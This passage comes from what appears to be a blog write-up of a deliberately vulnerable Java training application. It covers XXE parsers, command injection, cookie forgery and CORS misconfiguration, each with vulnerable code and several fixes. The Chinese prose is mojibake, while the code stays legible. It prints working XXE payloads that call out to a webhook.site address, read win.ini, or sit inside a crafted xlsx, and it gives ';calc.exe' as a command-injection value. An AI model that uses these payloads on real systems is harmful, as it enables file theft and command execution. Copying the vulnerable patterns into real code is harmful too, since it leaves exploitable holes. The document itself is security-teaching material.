            Document document = db.parse(is);  // parse xml

            // éå†xmlèŠ‚ç‚¹nameå’Œvalue
            StringBuilder buf = new StringBuilder();
            NodeList rootNodeList = document.getChildNodes();
            for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123;
                Node rootNode = rootNodeList.item(i);
                NodeList child = rootNode.getChildNodes();
                for (int j = 0; j &lt; child.getLength(); j++) &#123;
                    Node node = child.item(j);
                    buf.append(String.format(&quot;%s: %s\n&quot;, node.getNodeName(), node.getTextContent()));
                &#125;
            &#125;
            return buf.toString();
        &#125; catch (Exception e) &#123;
            e.printStackTrace();
            logger.error(e.toString());
            return e.toString();
        &#125;
    &#125;
</code></pre>
<p>è¿™æ˜¯JDKè‡ªå¸¦çš„ç±»ï¼Œä»¥æ­¤äº§ç”Ÿçš„XXEæ˜¯å­˜åœ¨å›æ˜¾çš„</p>
<h3 id="7-è·¯ç”±-x2F-xxe-x2F-DocumentBuilder-x2F-xinclude-x2F-vuln"><a href="#7-è·¯ç”±-x2F-xxe-x2F-DocumentBuilder-x2F-xinclude-x2F-vuln" class="headerlink" title="7.è·¯ç”±&#x2F;xxe&#x2F;DocumentBuilder&#x2F;xinclude&#x2F;vuln"></a>7.è·¯ç”±&#x2F;xxe&#x2F;DocumentBuilder&#x2F;xinclude&#x2F;vuln</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="Java">@RequestMapping(value = &quot;/DocumentBuilder/xinclude/vuln&quot;, method = RequestMethod.POST)
    public String DocumentBuilderXincludeVuln(HttpServletRequest request) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            dbf.setXIncludeAware(true);   // æ”¯æŒXInclude
            dbf.setNamespaceAware(true);  // æ”¯æŒXInclude
            DocumentBuilder db = dbf.newDocumentBuilder();
            StringReader sr = new StringReader(body);
            InputSource is = new InputSource(sr);
            Document document = db.parse(is);  // parse xml

            NodeList rootNodeList = document.getChildNodes();
            response(rootNodeList);

            sr.close();
            return &quot;DocumentBuilder xinclude xxe vuln code&quot;;
        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;
    &#125;
</code></pre>
<h3 id="8-è·¯ç”±-x2F-xxe-x2F-XMLReader-x2F-vuln"><a href="#8-è·¯ç”±-x2F-xxe-x2F-XMLReader-x2F-vuln" class="headerlink" title="8.è·¯ç”±&#x2F;xxe&#x2F;XMLReader&#x2F;vuln"></a>8.è·¯ç”±&#x2F;xxe&#x2F;XMLReader&#x2F;vuln</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="java">@PostMapping(&quot;/XMLReader/vuln&quot;)
    public String XMLReaderVuln(HttpServletRequest request) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXParserFactory spf = SAXParserFactory.newInstance();
            SAXParser saxParser = spf.newSAXParser();
            XMLReader xmlReader = saxParser.getXMLReader();
            xmlReader.parse(new InputSource(new StringReader(body)));

        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;

        return &quot;XMLReader xxe vuln code&quot;;
    &#125;
</code></pre>
<h3 id="9-è·¯ç”±-x2F-xxe-x2F-DocumentHelper-x2F-vuln"><a href="#9-è·¯ç”±-x2F-xxe-x2F-DocumentHelper-x2F-vuln" class="headerlink" title="9.è·¯ç”±&#x2F;xxe&#x2F;DocumentHelper&#x2F;vuln"></a>9.è·¯ç”±&#x2F;xxe&#x2F;DocumentHelper&#x2F;vuln</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code>@PostMapping(&quot;/DocumentHelper/vuln&quot;)
    public String DocumentHelper(HttpServletRequest req) &#123;
        try &#123;
            String body = WebUtils.getRequestBody(req);
            DocumentHelper.parseText(body); // parse xml
        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
            return EXCEPT;
        &#125;

        return &quot;DocumentHelper xxe vuln code&quot;;
    &#125;


    private static void response(NodeList rootNodeList)&#123;
        for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123;
            Node rootNode = rootNodeList.item(i);
            NodeList xxe = rootNode.getChildNodes();
            for (int j = 0; j &lt; xxe.getLength(); j++) &#123;
                Node xxeNode = xxe.item(j);
                // æµ‹è¯•ä¸èƒ½blind xxeï¼Œæ‰€ä»¥å¼ºè¡ŒåŠ äº†ä¸€ä¸ªå›æ˜¾
                logger.info(&quot;xxeNode: &quot; + xxeNode.getNodeValue());
            &#125;

        &#125;
    &#125;
</code></pre>
<p>ä¿®å¤è¯¥æ¼æ´åªéœ€å‡çº§dom4jåˆ°2.1.1åŠä»¥ä¸Šï¼Œè¯¥ç‰ˆæœ¬åŠä»¥ä¸Šç¦ç”¨äº†ENTITYï¼Œä¸å¸¦ENTITYçš„PoCä¸èƒ½åˆ©ç”¨ï¼Œæ‰€ä»¥ç¦ç”¨ENTITYå³å¯å®Œæˆä¿®å¤ã€‚</p>
<h3 id="ä¸Šè¿°å­˜åœ¨XXEæ¼æ´åº“å¯¹æ¯”"><a href="#ä¸Šè¿°å­˜åœ¨XXEæ¼æ´åº“å¯¹æ¯”" class="headerlink" title="ä¸Šè¿°å­˜åœ¨XXEæ¼æ´åº“å¯¹æ¯”"></a>ä¸Šè¿°å­˜åœ¨XXEæ¼æ´åº“å¯¹æ¯”</h3><table>
<thead>
<tr>
<th><strong>å·¥å…·&#x2F;ç±»</strong></th>
<th><strong>ç®€ä»‹</strong></th>
<th><strong>ä½¿ç”¨åœºæ™¯</strong></th>
<th><strong>ä¼˜ç‚¹</strong></th>
<th><strong>ç¼ºç‚¹</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>xmlReader</code></td>
<td>SAX çš„æ¥å£ï¼ŒåŸºäºäº‹ä»¶é©±åŠ¨çš„è§£æ</td>
<td>å¤„ç†å¤§å‹ XML æ–‡ä»¶</td>
<td>å†…å­˜å ç”¨å°ï¼Œé€Ÿåº¦å¿«</td>
<td>éœ€è¦æ‰‹åŠ¨ç®¡ç†ä¸Šä¸‹æ–‡ï¼Œå¤„ç†å¤æ‚ç»“æ„å›°</td>
</tr>
<tr>
<td><code>SAXBuilder</code></td>
<td>JDOM ä¸­åŸºäº SAX çš„è§£æå™¨</td>
<td>éœ€è¦ç”¨ JDOM å¤„ç† XML æ•°æ®æ—¶</td>
<td>ç»“åˆäº† SAX çš„é«˜æ•ˆæ€§å’Œ JDOM çš„æ˜“ç”¨æ€§</td>
<td>è§£æé€Ÿåº¦ä¾èµ–äº SAXï¼Œçµæ´»æ€§ä½äº DOM</td>
</tr>
<tr>
<td>SAXReader&#96;</td>
<td>Dom4j ä¸­åŸºäº SAX çš„è§£æå™¨</td>
<td>éœ€è¦ Dom4j è¿›è¡Œ XML æ“ä½œæ—¶</td>
<td>é«˜æ•ˆä¸”çµæ´»ï¼Œæ”¯æŒæ ‘ç»“æ„</td>
<td>æ€§èƒ½ç•¥é€Šäºçº¯ SAX</td>
</tr>
<tr>
<td><code>SAXParser</code></td>
<td>Java ä¸­çš„ SAX è§£æå™¨</td>
<td>åŸºäºäº‹ä»¶é©±åŠ¨çš„è§£æï¼Œé€‚åˆå¤„ç†å¤§å‹ XML æ–‡ä»¶</td>
<td>é«˜æ•ˆï¼Œå†…å­˜å ç”¨å°</td>
<td>è§£æå¤æ‚ XML éœ€è¦æ‰‹åŠ¨å¤„ç†å›è°ƒ</td>
</tr>
<tr>
<td>Digester&#96;</td>
<td>åŸºäº SAXï¼Œå°† XML æ˜ å°„åˆ° Java å¯¹è±¡ï¼ˆApache Commons æä¾›ï¼‰</td>
<td>éœ€è¦å°† XML æ˜ å°„ä¸º Java å¯¹è±¡æ—¶</td>
<td>ç®€åŒ– XML ä¸ Java å¯¹è±¡çš„æ˜ å°„</td>
<td>å¯¹å¤§æ–‡ä»¶ä¸å‹å¥½ï¼Œçµæ´»æ€§è¾ƒä½</td>
</tr>
<tr>
<td>DocumentBuilder&#96;</td>
<td>Java ä¸­ DOM è§£æå™¨ï¼Œç”¨äºæ„å»ºæ ‘çŠ¶ç»“æ„</td>
<td>éœ€è¦å®Œæ•´æ ‘ç»“æ„æ“ä½œï¼Œå¦‚ä¿®æ”¹å’Œå¤šæ¬¡éå† XML æ–‡ä»¶</td>
<td>å®Œæ•´ä¿ç•™æ–‡æ¡£ç»“æ„ï¼Œæ˜“äºæŸ¥æ‰¾å’Œä¿®æ”¹</td>
<td>å†…å­˜å ç”¨è¾ƒå¤§ï¼Œå¤„ç†å¤§æ–‡ä»¶æ—¶æ€§èƒ½è¾ƒå·®</td>
</tr>
<tr>
<td><code>DocumentHelper</code></td>
<td>Dom4j æä¾›çš„è¾…åŠ©ç±»ï¼Œç”¨äºå¿«é€Ÿåˆ›å»ºå’Œæ“ä½œ XML æ–‡æ¡£</td>
<td>éœ€è¦æ‰‹åŠ¨æ„å»ºå’Œæ“ä½œ XML æ–‡æ¡£æ—¶</td>
<td>å¿«é€Ÿåˆ›å»ºå’Œå¤„ç† XML æ–‡æ¡£ï¼Œçµæ´»æ€§é«˜</td>
<td>å†…å­˜å ç”¨è¾ƒå¤§ï¼Œå¤„ç†è¶…å¤§æ–‡ä»¶æ—¶æ€§èƒ½ä¸ä½³</td>
</tr>
</tbody></table>
<h4 id="ç»Ÿä¸€æ¼æ´åˆ©ç”¨payloadï¼š"><a href="#ç»Ÿä¸€æ¼æ´åˆ©ç”¨payloadï¼š" class="headerlink" title="ç»Ÿä¸€æ¼æ´åˆ©ç”¨payloadï¼š"></a>ç»Ÿä¸€æ¼æ´åˆ©ç”¨payloadï¼š</h4><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;https://webhook.site/bef89c10-3850-4342-8f7e-934073c0cc12&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;
</code></pre>
<p>POSTä¼ å…¥ï¼š</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008105859368.png" alt="image-20241008105859368"></p>
<p>æ¥æ”¶åˆ°DNSLOG</p>
<p><img src="C:\Users\ttycp3\AppData\Roaming\Typora\typora-user-images\image-20241008105829498.png" alt="image-20241008105829498"></p>
<h4 id="ç»Ÿä¸€ä¿®å¤ä»£ç "><a href="#ç»Ÿä¸€ä¿®å¤ä»£ç " class="headerlink" title="ç»Ÿä¸€ä¿®å¤ä»£ç "></a>ç»Ÿä¸€ä¿®å¤ä»£ç </h4><pre><code class="java">//å®ä¾‹åŒ–è§£æç±»ä¹‹åé€šå¸¸ä¼šæ”¯æŒç€ä¸‰ä¸ªé…ç½®
obj.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
obj.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
obj.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
</code></pre>
<p>ç¦ç”¨äº†å¤–éƒ¨å®ä½“ï¼Œé™åˆ¶å®ä½“æ¥æºã€‚</p>
<h3 id="10-è·¯ç”±-x2F-xxe-x2F-xmlbeam-x2F-vuln"><a href="#10-è·¯ç”±-x2F-xxe-x2F-xmlbeam-x2F-vuln" class="headerlink" title="10.è·¯ç”±&#x2F;xxe&#x2F;xmlbeam&#x2F;vuln"></a>10.è·¯ç”±&#x2F;xxe&#x2F;xmlbeam&#x2F;vuln</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="Java">        @PostMapping(value = &quot;/xmlbeam/vuln&quot;)
        HttpEntity&lt;String&gt; post(@RequestBody UserPayload user) &#123;
            try &#123;
                logger.info(user.toString());
                return ResponseEntity.ok(String.format(&quot;hello, %s!&quot;, user.getUserName()));
            &#125;catch (Exception e)&#123;
                e.printStackTrace();
                return ResponseEntity.ok(&quot;error&quot;);
            &#125;
        &#125;

        /**
         * The projection interface using XPath and JSON Path expression to selectively pick elements from the payload.
         */
        @ProjectedPayload
        public interface UserPayload &#123;
            @XBRead(&quot;//userName&quot;)
            String getUserName();
        &#125;
</code></pre>
<p>è¯¥ä»£ç éœ€è¦ä½¿ç”¨å›ºå®šçš„æ ‡ç­¾å¯ä»¥å®ç°å›æ˜¾ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ payloadï¼š</p>
<pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE foo [  
    &lt;!ENTITY xxe SYSTEM &quot;file:/c:/Windows/win.ini&quot;&gt;  
]&gt;
&lt;userPayload&gt;
    &lt;userName&gt;&amp;xxe;&lt;/userName&gt;
&lt;/userPayload&gt;
</code></pre>
<p>é€šè¿‡æŠ“åŒ…ä¸Šä¼ å®ç°ä»»æ„æ–‡ä»¶è¯»å–</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008142315473.png" alt="image-20241008142315473"></p>
<h3 id="11-è·¯ç”±-x2F-ooxml-x2F-readxlsx"><a href="#11-è·¯ç”±-x2F-ooxml-x2F-readxlsx" class="headerlink" title="11.è·¯ç”±&#x2F;ooxml&#x2F;readxlsx"></a>11.è·¯ç”±&#x2F;ooxml&#x2F;readxlsx</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="Java"> @PostMapping(&quot;/readxlsx&quot;)
    @ResponseBody
    public String ooxml_xxe(MultipartFile file) throws IOException &#123;
        XSSFWorkbook wb = new XSSFWorkbook(file.getInputStream()); // xxe vuln

        XSSFSheet sheet = wb.getSheetAt(0);
        XSSFRow row;
        XSSFCell cell;

        Iterator rows = sheet.rowIterator();
        StringBuilder sbResult = new StringBuilder();

        while (rows.hasNext()) &#123;

            row = (XSSFRow) rows.next();
            Iterator cells = row.cellIterator();

            while (cells.hasNext()) &#123;
                cell = (XSSFCell) cells.next();

                if (cell.getCellType() == XSSFCell.CELL_TYPE_STRING) &#123;
                    sbResult.append(cell.getStringCellValue()).append(&quot; &quot;);
                &#125; else if (cell.getCellType() == XSSFCell.CELL_TYPE_NUMERIC) &#123;
                    sbResult.append(cell.getNumericCellValue()).append(&quot; &quot;);
                &#125; else &#123;
                    logger.info(&quot;errors&quot;);
                &#125;
            &#125;
        &#125;

        return sbResult.toString();
    &#125;
</code></pre>
<p>æŸ¥çœ‹æºç å¾—çŸ¥ä½¿ç”¨çš„æ˜¯poi-ooxmlç»„ä»¶ï¼ˆ Apache POIæ˜¯æä¾›Microsoft Officeç³»åˆ—æ–‡æ¡£è¯»ã€å†™åŠŸèƒ½çš„ JAVA ç±»åº“ï¼‰è¿›è¡Œxlsxæ–‡ä»¶æ“ä½œï¼Œåœ¨3.10ç‰ˆæœ¬åŠä»¥ä¸‹å­˜åœ¨XXEæ³¨å…¥æ¼æ´ï¼Œ3.15ä»¥ä¸‹ç‰ˆæœ¬å­˜åœ¨Dosæ¼æ´ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯3.9ç‰ˆæœ¬ã€‚</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241009104055332.png" alt="image-20241009104055332"></p>
<p>ç”¨å‹ç¼©ç¨‹åºæ‰“å¼€ç”Ÿæˆçš„æµ‹è¯•xlsxè¡¨æ ¼ï¼Œåœ¨[Content_Types].xmlæ–‡ä»¶ä¸­æ’å…¥æ”»å‡»ä»£ç ï¼š</p>
<pre><code class="xml-dtd">&lt;!DOCTYPE test [
    &lt;!ELEMENT foo ANY&gt;
    &lt;!ENTITY xxe SYSTEM &quot;https://webhook.site/423855a2-9152-4556-b8d3-a0450e32819c&quot;&gt;
]&gt;
&lt;test&gt;&amp;xxe;&lt;/test&gt;
</code></pre>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241009110131500.png" alt="image-20241009110131500"></p>
<p>ç„¶åå‹ç¼©ä¸º1.zip,æ”¹åç¼€ä¸º1.xlsx,ä¸Šä¼ åå®ç°å‘½ä»¤æ‰§è¡Œ</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241009110238586.png" alt="image-20241009110238586"></p>
<h3 id="12-è·¯ç”±-x2F-xlsx-streamer-x2F-readxlsx"><a href="#12-è·¯ç”±-x2F-xlsx-streamer-x2F-readxlsx" class="headerlink" title="12.è·¯ç”±&#x2F;xlsx-streamer&#x2F;readxlsx"></a>12.è·¯ç”±&#x2F;xlsx-streamer&#x2F;readxlsx</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="java"> @PostMapping(&quot;/readxlsx&quot;)
    public void xllx_streamer_xxe(MultipartFile file) throws IOException &#123;
        StreamingReader.builder().open(file.getInputStream());
    &#125;
</code></pre>
<p>æ¢äº†ä¸ªåº“ï¼ŒåŸç†payload åŒä¸Š</p>
<h2 id="å…«ã€å‘½ä»¤æ³¨å…¥"><a href="#å…«ã€å‘½ä»¤æ³¨å…¥" class="headerlink" title="å…«ã€å‘½ä»¤æ³¨å…¥"></a>å…«ã€å‘½ä»¤æ³¨å…¥</h2><h3 id="1-è·¯ç”±-x2F-codeinject"><a href="#1-è·¯ç”±-x2F-codeinject" class="headerlink" title="1.è·¯ç”±&#x2F;codeinject"></a>1.è·¯ç”±&#x2F;codeinject</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="java">    @GetMapping(&quot;/codeinject&quot;)
    public String codeInject(String filepath) throws IOException &#123;

        String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filepath&#125;;
        ProcessBuilder builder = new ProcessBuilder(cmdList);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        return WebUtils.convertStreamToString(process.getInputStream());
    &#125;
</code></pre>
<p>ä¼ å…¥çš„filepathå‚æ•°ç›´æ¥ä¸åŸå‘½ä»¤æ‹¼æ¥ï¼Œå¯ä»¥å®ç°å‘½ä»¤æ³¨å…¥ï¼Œæ„é€ payloadï¼š</p>
<pre><code>;calc.exe
</code></pre>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008144233099.png" alt="image-20241008144233099"></p>
<h3 id="2-è·¯ç”±-x2F-codeinject-x2F-host"><a href="#2-è·¯ç”±-x2F-codeinject-x2F-host" class="headerlink" title="2.è·¯ç”±&#x2F;codeinject&#x2F;host"></a>2.è·¯ç”±&#x2F;codeinject&#x2F;host</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="Java">@GetMapping(&quot;/codeinject/host&quot;)
    public String codeInjectHost(HttpServletRequest request) throws IOException &#123;

        String host = request.getHeader(&quot;host&quot;);
        logger.info(host);
        String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;curl &quot; + host&#125;;
        ProcessBuilder builder = new ProcessBuilder(cmdList);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        return WebUtils.convertStreamToString(process.getInputStream());
    &#125;
</code></pre>
<p>åŒæ ·å¯ä»¥å®ç°å‘½ä»¤æ‹¼æ¥ï¼Œæ„é€ payloadï¼š</p>
<pre><code>;calc.exe
</code></pre>
<p>ä¿®æ”¹hostå­—æ®µå®ç°å‘½ä»¤æ‹¼æ¥</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008144612745.png" alt="image-20241008144612745"></p>
<h3 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h3><p>ä¿®å¤ä»£ç </p>
<pre><code class="java">    @GetMapping(&quot;/codeinject/sec&quot;)
    public String codeInjectSec(String filepath) throws IOException &#123;
        String filterFilePath = SecurityUtil.cmdFilter(filepath);
        if (null == filterFilePath) &#123;
            return &quot;Bad boy. I got u.&quot;;
        &#125;
        String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filterFilePath&#125;;
        ProcessBuilder builder = new ProcessBuilder(cmdList);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        return WebUtils.convertStreamToString(process.getInputStream());
    &#125;
</code></pre>
<p>cmdFilterå‡½æ•°ä»£ç ï¼š</p>
<pre><code class="Java">private static final Pattern FILTER_PATTERN = Pattern.compile(&quot;^[a-zA-Z0-9_/\\.-]+$&quot;);
   public static String cmdFilter(String input) &#123;
        if (!FILTER_PATTERN.matcher(input).matches()) &#123;
            return null;
        &#125;

        return input;
    &#125;
</code></pre>
<p>é™åˆ¶äº†å‚æ•°ä¸­çš„å­—ç¬¦ï¼Œé˜²æ­¢å‘½ä»¤æ³¨å…¥ã€‚</p>
<h2 id="ä¹ã€Cookieä¼ªé€ "><a href="#ä¹ã€Cookieä¼ªé€ " class="headerlink" title="ä¹ã€Cookieä¼ªé€ "></a>ä¹ã€Cookieä¼ªé€ </h2><h3 id="1-è·¯ç”±-x2F-cookie-x2F-vuln01"><a href="#1-è·¯ç”±-x2F-cookie-x2F-vuln01" class="headerlink" title="1.è·¯ç”±&#x2F;cookie&#x2F;vuln01"></a>1.è·¯ç”±&#x2F;cookie&#x2F;vuln01</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="java">    private static String NICK = &quot;nick&quot;;

    @GetMapping(value = &quot;/vuln01&quot;)
    public String vuln01(HttpServletRequest req) &#123;
        String nick = WebUtils.getCookieValueByName(req, NICK); // key code
        return &quot;Cookie nick: &quot; + nick;
    &#125;
</code></pre>
<h3 id="2-è·¯ç”±-x2F-cookie-x2F-vuln02"><a href="#2-è·¯ç”±-x2F-cookie-x2F-vuln02" class="headerlink" title="2.è·¯ç”±&#x2F;cookie&#x2F;vuln02"></a>2.è·¯ç”±&#x2F;cookie&#x2F;vuln02</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="Java"> @GetMapping(value = &quot;/vuln02&quot;)
    public String vuln02(HttpServletRequest req) &#123;
        String nick = null;
        Cookie[] cookie = req.getCookies();

        if (cookie != null) &#123;
            nick = getCookie(req, NICK).getValue();  // key code
        &#125;

        return &quot;Cookie nick: &quot; + nick;
    &#125;
</code></pre>
<h3 id="3-è·¯ç”±-x2F-cookie-x2F-vuln03"><a href="#3-è·¯ç”±-x2F-cookie-x2F-vuln03" class="headerlink" title="3.è·¯ç”±&#x2F;cookie&#x2F;vuln03"></a>3.è·¯ç”±&#x2F;cookie&#x2F;vuln03</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="Java">   @GetMapping(value = &quot;/vuln03&quot;)
    public String vuln03(HttpServletRequest req) &#123;
        String nick = null;
        Cookie cookies[] = req.getCookies();
        if (cookies != null) &#123;
            for (Cookie cookie : cookies) &#123;
                // key code. Equals can also be equalsIgnoreCase.
                if (NICK.equals(cookie.getName())) &#123;
                    nick = cookie.getValue();
                &#125;
            &#125;
        &#125;
        return &quot;Cookie nick: &quot; + nick;
    &#125;
</code></pre>
<h3 id="4-è·¯ç”±-x2F-cookie-x2F-vuln04"><a href="#4-è·¯ç”±-x2F-cookie-x2F-vuln04" class="headerlink" title="4.è·¯ç”±&#x2F;cookie&#x2F;vuln04"></a>4.è·¯ç”±&#x2F;cookie&#x2F;vuln04</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="Java">@GetMapping(value = &quot;/vuln04&quot;)
    public String vuln04(HttpServletRequest req) &#123;
        String nick = null;
        Cookie cookies[] = req.getCookies();
        if (cookies != null) &#123;
            for (Cookie cookie : cookies) &#123;
                if (cookie.getName().equalsIgnoreCase(NICK)) &#123;  // key code
                    nick = cookie.getValue();
                &#125;
            &#125;
        &#125;
        return &quot;Cookie nick: &quot; + nick;
    &#125;
</code></pre>
<h3 id="5-è·¯ç”±-x2F-cookie-x2F-vuln05"><a href="#5-è·¯ç”±-x2F-cookie-x2F-vuln05" class="headerlink" title="5.è·¯ç”±&#x2F;cookie&#x2F;vuln05"></a>5.è·¯ç”±&#x2F;cookie&#x2F;vuln05</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="Java">   @GetMapping(value = &quot;/vuln05&quot;)
    public String vuln05(@CookieValue(&quot;nick&quot;) String nick) &#123;
        return &quot;Cookie nick: &quot; + nick;
    &#125;
</code></pre>
<h3 id="6-è·¯ç”±-x2F-cookie-x2F-vuln06"><a href="#6-è·¯ç”±-x2F-cookie-x2F-vuln06" class="headerlink" title="6.è·¯ç”±&#x2F;cookie&#x2F;vuln06"></a>6.è·¯ç”±&#x2F;cookie&#x2F;vuln06</h3><p>æ¼æ´ä»£ç :</p>
<pre><code>@GetMapping(value = &quot;/vuln06&quot;)
    public String vuln06(@CookieValue(value = &quot;nick&quot;) String nick) &#123;
        return &quot;Cookie nick: &quot; + nick;
    &#125;
</code></pre>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ä¿®æ”¹cookieçš„å€¼å®ç°å¯¹nickå€¼çš„ä¿®æ”¹ï¼ŒæŸäº›æƒ…å†µå¯èƒ½ä¼šå­˜åœ¨è¶Šæƒæ¼æ´ï¼Œæ“ä½œå¦‚ä¸‹ï¼š</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008145950138.png" alt="image-20241008145950138"></p>
<h2 id="åã€CORS"><a href="#åã€CORS" class="headerlink" title="åã€CORS"></a>åã€CORS</h2><p>CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰æ˜¯ç”¨æ¥å®ç°è·¨åŸŸèµ„æºè®¿é—®çš„ï¼Œæ¯”å¦‚æœ‰ä¸¤ä¸ªåŸŸa1.comå’Œb1.comï¼Œå‡è®¾b1.comä¸Šé¢æœ‰ä¸ªæ¥å£èƒ½å¤Ÿè·å–ä¸€äº›è¿”å›çš„æ•°æ®ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬ä»a1.comå†™ä¸€æ®µjså»è¯·æ±‚è¿™ä¸ªæ¥å£çš„æ•°æ®ï¼Œä¸€èˆ¬æ¥è¯´æ˜¯è¯·æ±‚ä¸äº†çš„ï¼Œä¼šåœ¨æµè§ˆå™¨çˆ†å‡ºCORSé”™è¯¯ï¼Œä½†å¦‚æœæœ‰CORSè®¾ç½®ï¼Œå°±å¯ä»¥å®ç°è¿™æ ·çš„è®¿é—®ï¼Œç”šè‡³å¯ä»¥èƒ½å¤Ÿä½¿ç”¨b1.comä¸Šçš„cookieã€‚</p>
<h3 id="1-è·¯ç”±-x2F-cors-x2F-vuln-x2F-origin"><a href="#1-è·¯ç”±-x2F-cors-x2F-vuln-x2F-origin" class="headerlink" title="1.è·¯ç”±&#x2F;cors&#x2F;vuln&#x2F;origin"></a>1.è·¯ç”±&#x2F;cors&#x2F;vuln&#x2F;origin</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="java">    private static String info = &quot;&#123;\&quot;name\&quot;: \&quot;JoyChou\&quot;, \&quot;phone\&quot;: \&quot;18200001111\&quot;&#125;&quot;;

    @GetMapping(&quot;/vuln/origin&quot;)
    public String vuls1(HttpServletRequest request, HttpServletResponse response) &#123;
        String origin = request.getHeader(&quot;origin&quot;);
        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); // set origin from header
        response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);  // allow cookie
        return info;
    &#125;
</code></pre>
<h3 id="2-è·¯ç”±-x2F-cors-x2F-vuln-x2F-setHeader"><a href="#2-è·¯ç”±-x2F-cors-x2F-vuln-x2F-setHeader" class="headerlink" title="2.è·¯ç”±&#x2F;cors&#x2F;vuln&#x2F;setHeader"></a>2.è·¯ç”±&#x2F;cors&#x2F;vuln&#x2F;setHeader</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="java">@GetMapping(&quot;/vuln/setHeader&quot;)
    public String vuls2(HttpServletResponse response) &#123;
        // åç«¯è®¾ç½®Access-Control-Allow-Originä¸º*çš„æƒ…å†µä¸‹ï¼Œè·¨åŸŸçš„æ—¶å€™å‰ç«¯å¦‚æœè®¾ç½®withCredentialsä¸ºtrueä¼šå¼‚å¸¸
        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);
        return info;
    &#125;
</code></pre>
<h3 id="3-è·¯ç”±-x2F-cors-x2F-vuln-x2F-crossOrigin"><a href="#3-è·¯ç”±-x2F-cors-x2F-vuln-x2F-crossOrigin" class="headerlink" title="3.è·¯ç”±&#x2F;cors&#x2F;vuln&#x2F;crossOrigin"></a>3.è·¯ç”±&#x2F;cors&#x2F;vuln&#x2F;crossOrigin</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="Java">    @GetMapping(&quot;*&quot;)
    @RequestMapping(&quot;/vuln/crossOrigin&quot;)
    public String vuls3() &#123;
        return info;
    &#125;
</code></pre>
<h3 id="æ¼æ´éªŒè¯"><a href="#æ¼æ´éªŒè¯" class="headerlink" title="æ¼æ´éªŒè¯"></a>æ¼æ´éªŒè¯</h3><p>å¯é€šè¿‡æŠ“åŒ…ä¿®æ”¹originå­—æ®µéªŒè¯æ¼æ´</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008155935546.png" alt="image-20241008155935546"></p>
